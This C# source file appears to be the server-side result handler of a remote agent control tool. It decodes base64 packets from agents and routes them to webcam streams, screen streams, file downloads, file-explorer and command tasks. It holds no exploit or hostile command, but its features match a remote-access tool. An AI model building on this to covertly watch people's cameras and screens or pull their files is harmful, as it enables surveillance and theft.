using Libra.Server.Service.Agent;
using Libra.Virgo.Enum;
using Libra.Virgo.Models.MessageType;
using Newtonsoft.Json;
using System.Text;
using System.Text.Json;

namespace Libra.Server.Handle
{
    internal class CommandHandle
    {
        static CommandResult Packet = new();
        public static void Handle(object? pack)
        {
            if (pack == null) return;

            if (pack is Newtonsoft.Json.Linq.JObject jObject)
            {
                Packet = jObject.ToObject<CommandResult>();
            }
            else
            {
                try
                {
                    Packet = (CommandResult)pack;
                }
                catch
                {
                    return;
                }
            }

            if (Packet == null) return;

            if (CameraStreamManager.IsActiveStream(Packet.TaskId))
            {
                try
                {
                    var b64 = Packet.Result?.ToString() ?? "";
                    if (!string.IsNullOrEmpty(b64))
                    {
                        var frameJson = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                        var frame = System.Text.Json.JsonSerializer.Deserialize<ScreenFrame>(
                            frameJson, VirgoJsonSerializerOptions);
                        if (frame != null)
                            CameraStreamManager.TryPushFrame(Packet.TaskId, frame);
                    }
                }
                catch
                {
                }
                return;
            }

            if (ScreenStreamManager.IsActiveStream(Packet.TaskId))
            {
                try
                {
                    var b64 = Packet.Result?.ToString() ?? "";
                    if (!string.IsNullOrEmpty(b64))
                    {
                        var frameJson = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                        var frame = System.Text.Json.JsonSerializer.Deserialize<ScreenFrame>(
                            frameJson, VirgoJsonSerializerOptions);
                        if (frame != null)
                            ScreenStreamManager.TryPushFrame(Packet.TaskId, frame);
                    }
                }
                catch
                {
                }
                return;
            }

            if (FileDownloadManager.IsActive(Packet.TaskId))
            {
                var b64 = Packet.Result?.ToString() ?? "";
                if (string.IsNullOrEmpty(b64))
                    FileDownloadManager.Complete(Packet.TaskId);
                else
                    FileDownloadManager.PushChunk(Packet.TaskId, Convert.FromBase64String(b64));
                return;
            }

            if (TaskList.CommandTasks.TryGetValue(Packet.TaskId, out var task))
            {
                task.Result = Packet.Result;
                task.EndTime = Packet.EndTime;
                task.IsCompleted = true;
            }
            else if (TaskList.FrameTasks.TryGetValue(Packet.TaskId, out var frame2))
            {
                frame2.Result = Packet.Result;
                frame2.EndTime = Packet.EndTime;
                frame2.IsCompleted = true;
            }
            else if (TaskList.ExplorerTasks.TryGetValue(Packet.TaskId, out var explorer))
            {
                explorer.Result = Packet.Result;
                explorer.EndTime = Packet.EndTime;
                explorer.IsCompleted = true;

            }
            else if (TaskList.CameraFrameTasks.TryGetValue(Packet.TaskId, out var camera))
            {
                camera.Result = Packet.Result;
                camera.EndTime = Packet.EndTime;
                camera.IsCompleted = true;
            }

        }

        private static readonly System.Text.Json.JsonSerializerOptions VirgoJsonSerializerOptions = new()
        {
            PropertyNamingPolicy = System.Text.Json.JsonNamingPolicy.CamelCase
        };
    }
}

